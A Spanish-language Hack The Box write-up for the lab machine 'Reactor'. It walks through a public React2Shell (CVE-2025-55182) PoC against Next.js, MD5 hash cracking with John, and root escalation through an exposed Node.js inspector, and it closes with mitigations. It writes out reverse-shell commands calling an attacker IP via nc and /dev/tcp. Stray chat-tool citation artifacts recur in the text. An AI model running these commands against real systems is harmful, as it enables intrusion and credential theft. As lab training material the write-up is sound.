# Reactor

**Plataforma:** Hack The Box  
**Dificultad:** Fácil  
**Categoría:** Linux / Web / Next.js / RCE / Node.js Inspector

## 1. Reconocimiento

### Nmap

- Lanzamos un escaneo para identificar los puertos y servicios:

```bash
nmap -sCV -Pn 10.129.119.171
```

- Encontramos:

- `22/tcp` → SSH
- `3000/tcp` → HTTP — Next.js

- Utilizamos `whatweb` para identificar la tecnología y versión:

```bash
whatweb http://10.129.119.171:3000
```

- Identificamos **Next.js 15.0.3**.

## 2. Enumeración

### Fuzzing web

- Realizamos fuzzing utilizando una wordlist pequeña:

```bash
ffuf -u http://10.129.119.171:3000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

- No encontramos nada interesante.

- Probamos con una wordlist más grande:

```bash
ffuf -u http://10.129.119.171:3000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 200
```

- Tampoco encontramos rutas relevantes.

### Identificación de vulnerabilidad

- Al no encontrar nuevas rutas, nos centramos en la versión de Next.js.

- Tenemos:

```text
Next.js 15.0.3
```

- Esta versión se encuentra dentro del rango afectado por **React2Shell**, asociado a:

```text
CVE-2025-55182
```

- React identifica CVE-2025-55182 como una vulnerabilidad crítica de RCE no autenticado en React Server Components. Next.js publicó posteriormente el aviso correspondiente para las versiones afectadas de Next.js. :contentReference[oaicite:0]{index=0}

## 3. Explotación

### React2Shell — CVE-2025-55182

- Clonamos el PoC:

```bash
git clone https://github.com/jensnesten/React2Shell-PoC.git
```

- Entramos en el directorio:

```bash
cd React2Shell-PoC
```

- Probamos primero una ejecución sencilla para comprobar la vulnerabilidad:

```bash
python3 main.py http://10.129.119.171:3000 'id'
```

- El comando se ejecuta correctamente, por lo que confirmamos **RCE**.

### Reverse Shell

- En nuestra máquina nos ponemos a la escucha:

```bash
nc -lvnp 9005
```

- Utilizamos el PoC para ejecutar una reverse shell:

```bash
python3 main.py http://10.129.119.171:3000 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.206 9005 >/tmp/f'
```

- Recibimos la conexión y obtenemos una shell sobre la máquina.

### Mejorar la shell

- Ejecutamos:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

- Después configuramos correctamente el terminal:

```text
Ctrl + Z
```

```bash
stty raw -echo
fg
```

```bash
export TERM=xterm
```

- Ahora disponemos de una shell más funcional.

### Credenciales en la base de datos

- Encontramos la base de datos de la aplicación:

```bash
cat /opt/reactor-app/reactor.db
```

- Se trata de una base de datos SQLite.

- Para visualizarla de una forma más cómoda utilizamos:

```bash
sqlite3 /opt/reactor-app/reactor.db ".dump"
```

- Encontramos la tabla `users`:

```text
INSERT INTO users VALUES(1,'admin','a203b22191d744a4e70ada5c101b17b8','administrator','admin@reactor.htb');
INSERT INTO users VALUES(2,'engineer','39d97110eafe2a9a68639812cd271e8e','operator','engineer@reactor.htb');
```

- Tenemos hashes de los usuarios `admin` y `engineer`.

- Guardamos el hash de `engineer` y lo intentamos crackear con John:

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash_engineer.txt
```

- Conseguimos recuperar la contraseña de `engineer`.

- El hash de `admin` no conseguimos crackearlo.

### Acceso mediante SSH

- Probamos las credenciales recuperadas contra SSH:

```bash
ssh engineer@10.129.119.171
```

- Conseguimos acceder como `engineer`.

- Nos desplazamos al directorio personal y obtenemos la User Flag.

## 4. Escalada de privilegios

### Enumeración inicial

- Comprobamos los permisos de `sudo`:

```bash
sudo -l
```

- No encontramos una vía útil para escalar privilegios.

- Buscamos binarios SUID:

```bash
find / -perm -4000 -type f 2>/dev/null
```

- Tampoco encontramos ningún binario SUID interesante.

### Enumeración de puertos internos

- Continuamos enumerando los servicios locales:

```bash
ss -tulnp
```

- Encontramos:

```text
127.0.0.1:9229
```

- El puerto `9229` es el puerto utilizado habitualmente por el **Node.js V8 Inspector** cuando una aplicación Node.js se ejecuta con `--inspect`. Node documenta que este inspector utiliza el Chrome DevTools Protocol y permite interactuar con el runtime mediante operaciones como `Runtime.evaluate`. :contentReference[oaicite:1]{index=1}

- Como el servicio está escuchando únicamente en:

```text
127.0.0.1:9229
```

no está expuesto directamente desde nuestra máquina, pero sí podemos interactuar con él desde la propia máquina víctima.

### Node Inspector

- Conectamos al inspector:

```bash
node inspect 127.0.0.1:9229
```

- El inspector permite evaluar JavaScript dentro del proceso Node.js.

- Probamos la ejecución de comandos del sistema mediante `child_process`:

```javascript
exec("process.mainModule.require('child_process').execSync('id').toString()")
```

- El comando se ejecuta dentro del proceso Node.js.

- Comprobamos el usuario y obtenemos privilegios de `root`.

### Reverse Shell como root

- En nuestra máquina nos ponemos a la escucha:

```bash
nc -nlvp 9005
```

- Desde el inspector ejecutamos:

```javascript
exec("process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.206/9005 0>&1\"').toString()")
```

- Recibimos una nueva reverse shell.

- Comprobamos:

```bash
whoami
```

- Obtenemos:

```text
root
```

- Ya tenemos privilegios máximos.

- Finalmente accedemos a la Root Flag:

```bash
cd /root
cat root.txt
```

## 5. Reporte

- La máquina **Reactor** expone SSH en el puerto `22` y una aplicación Next.js en el puerto `3000`.
- Mediante `whatweb` identificamos **Next.js 15.0.3**.
- El fuzzing no revela rutas interesantes, por lo que nos centramos en la versión identificada.
- Next.js 15.0.3 se encuentra afectado por **React2Shell / CVE-2025-55182**, una vulnerabilidad crítica de RCE no autenticado en React Server Components. :contentReference[oaicite:2]{index=2}
- Utilizamos el PoC para ejecutar comandos remotamente y confirmamos la RCE con `id`.
- Posteriormente obtenemos una reverse shell.
- Dentro del sistema encontramos la base de datos SQLite `reactor.db`.
- La tabla `users` contiene hashes MD5 de los usuarios `admin` y `engineer`.
- Crackeamos el hash de `engineer` con John the Ripper y utilizamos las credenciales obtenidas para acceder mediante SSH.
- Una vez autenticados como `engineer`, `sudo` y SUID no proporcionan un vector útil.
- Continuamos enumerando servicios locales y descubrimos el puerto `9229` escuchando en localhost.
- Este puerto corresponde al **Node.js V8 Inspector**, que permite interactuar con el proceso Node mediante el Chrome DevTools Protocol. :contentReference[oaicite:3]{index=3}
- Utilizamos `node inspect` para conectarnos al inspector y ejecutar JavaScript dentro del proceso.
- Mediante `child_process` conseguimos ejecutar comandos del sistema como el usuario con el que corre el proceso Node, que en este caso es `root`.
- Finalmente obtenemos una reverse shell como `root` y recuperamos la Root Flag.

### Cadena de ataque

```text
Nmap
 ↓
HTTP :3000
 ↓
Next.js 15.0.3
 ↓
CVE-2025-55182
 ↓
React2Shell
 ↓
RCE
 ↓
Reverse Shell
 ↓
reactor.db
 ↓
Hash MD5 de engineer
 ↓
John the Ripper
 ↓
SSH como engineer
 ↓
Enumeración local
 ↓
Node Inspector :9229
 ↓
Runtime.evaluate / child_process
 ↓
root
 ↓
Root Flag
```

### Vulnerabilidades encontradas

| Vulnerabilidad | Severidad | Impacto |
|---|---|---|
| React Server Components — CVE-2025-55182 | Crítica | RCE no autenticado |
| Hashes MD5 almacenados en SQLite | Alta | Permite recuperar credenciales mediante cracking |
| Node.js Inspector expuesto localmente | Crítica | Permite ejecutar código dentro del proceso Node |
| Proceso Node ejecutándose como root | Crítica | Permite convertir el acceso al inspector en acceso root |

### Mitigaciones

- Actualizar React y Next.js a versiones corregidas frente a CVE-2025-55182. :contentReference[oaicite:4]{index=4}
- No almacenar contraseñas utilizando MD5.
- Utilizar funciones de derivación de contraseñas adecuadas como Argon2id, bcrypt o scrypt.
- No ejecutar aplicaciones Node.js con privilegios de `root`.
- No dejar el Node.js Inspector habilitado en entornos de producción.
- Restringir el acceso al puerto del inspector mediante red y firewall.
- Aplicar el principio de mínimo privilegio.

## 🧠 Lessons Learned

- Cuando el fuzzing no descubre nada, la identificación de versiones puede revelar directamente una vulnerabilidad conocida.
- `whatweb` permite identificar tecnologías y versiones de aplicaciones web.
- React2Shell afecta a React Server Components y puede proporcionar RCE no autenticado en aplicaciones afectadas. :contentReference[oaicite:5]{index=5}
- SQLite puede contener credenciales y hashes que podemos extraer mediante `.dump`.
- Los hashes MD5 pueden atacarse mediante diccionarios con herramientas como John the Ripper.
- `ss -tulnp` permite descubrir servicios que no aparecen desde el exterior.
- El puerto `9229` es habitual en aplicaciones Node.js que utilizan V8 Inspector. :contentReference[oaicite:6]{index=6}
- El Node.js Inspector utiliza el Chrome DevTools Protocol y permite evaluar código dentro del proceso Node. :contentReference[oaicite:7]{index=7}
- Un servicio de debugging escuchando en localhost puede seguir siendo relevante para una escalada porque podemos interactuar con él después de obtener acceso local.
- Un proceso de Node.js ejecutándose como `root` convierte el acceso al inspector en un vector directo para obtener privilegios de root.
